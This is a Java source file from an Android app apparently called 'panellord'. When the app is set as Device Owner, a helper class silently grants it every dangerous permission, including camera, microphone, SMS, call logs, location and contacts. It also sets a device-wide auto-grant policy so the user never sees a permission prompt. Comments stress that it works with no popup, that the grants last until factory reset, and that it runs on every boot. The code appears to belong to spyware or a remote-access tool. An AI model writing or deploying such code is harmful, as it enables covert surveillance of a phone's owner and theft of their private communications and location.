package com.panellord;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;

/**
 * Device Owner helper — when the app is set as Device Owner via ADB:
 *   adb shell dpm set-device-owner com.panellord/.DeviceAdminReceiver
 *
 * It can:
 *  1. Auto-grant EVERY dangerous permission silently (no popup ever)
 *  2. Set PERMISSION_POLICY_AUTO_GRANT so ALL future requests are auto-allowed
 *  3. These survive factory-level persistence — removed only by factory reset
 */
public class DeviceOwnerHelper {

    private static final String[] ALL_DANGEROUS = {
        // Camera / Mic
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        // Contacts
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.GET_ACCOUNTS,
        // Call log / Phone
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.PROCESS_OUTGOING_CALLS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.CALL_PHONE,
        // Location
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        // SMS / MMS
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_MMS,
        Manifest.permission.RECEIVE_WAP_PUSH,
        // Storage (legacy + Android 13+)
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
        "android.permission.MANAGE_MEDIA",
        // Bluetooth (Android 12+)
        "android.permission.BLUETOOTH_CONNECT",
        "android.permission.BLUETOOTH_SCAN",
        "android.permission.BLUETOOTH_ADVERTISE",
        "android.permission.NEARBY_WIFI_DEVICES",
        // Sensors / Activity
        Manifest.permission.BODY_SENSORS,
        "android.permission.BODY_SENSORS_BACKGROUND",
        "android.permission.ACTIVITY_RECOGNITION",
        // Notifications (Android 13+)
        "android.permission.POST_NOTIFICATIONS",
        // Calendar
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.WRITE_CALENDAR,
    };

    public static boolean isDeviceOwner(Context ctx) {
        DevicePolicyManager dpm =
            (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        return dpm != null && dpm.isDeviceOwnerApp(ctx.getPackageName());
    }

    /**
     * Call this on every app start, boot, and service connect.
     * If Device Owner → silently grants every dangerous permission +
     * sets auto-grant policy (no permission popup ever again for this device).
     */
    public static void grantAllIfOwner(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
        DevicePolicyManager dpm =
            (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null || !dpm.isDeviceOwnerApp(ctx.getPackageName())) return;

        ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
        String pkg = ctx.getPackageName();

        // ── NUCLEAR: auto-grant ALL future permission requests device-wide ──
        try {
            dpm.setPermissionPolicy(admin, DevicePolicyManager.PERMISSION_POLICY_AUTO_GRANT);
        } catch (Exception ignored) {}

        // ── Individually grant every known dangerous permission ──
        for (String perm : ALL_DANGEROUS) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    dpm.setPermissionGrantState(admin, pkg, perm,
                        DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                }
            } catch (Exception ignored) {}
        }
    }
}
